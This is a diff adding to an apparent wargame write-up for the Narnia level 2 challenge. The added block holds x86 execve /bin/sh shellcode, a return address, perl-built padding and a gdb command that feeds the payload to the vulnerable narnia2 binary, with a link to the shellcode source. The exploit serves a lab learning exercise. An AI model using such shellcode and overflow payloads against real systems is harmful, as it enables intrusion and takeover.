@@ -72,6 +72,18 @@ Let's get started:
 
 3. what is the address of the top of the stack?
 
+```
+SHELLCODE=$'\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80'
+
+SHELLCODE_ADDR=$'\xf8\xd3\xff\xff'
+
+PADDING=$(perl -e 'print "A"x(128-25+4)')
+
+gdb --args ./narnia2 $(echo -e $(echo -e $SHELLCODE)$(echo -e $PADDING)$(echo -e $SHELLCODE_ADDR))
+
+https://packetstormsecurity.com/files/154870/Linux-x86-execve-bin-sh-Shellcode.html
+```
+
 ## Password for the next level:
 ```
 
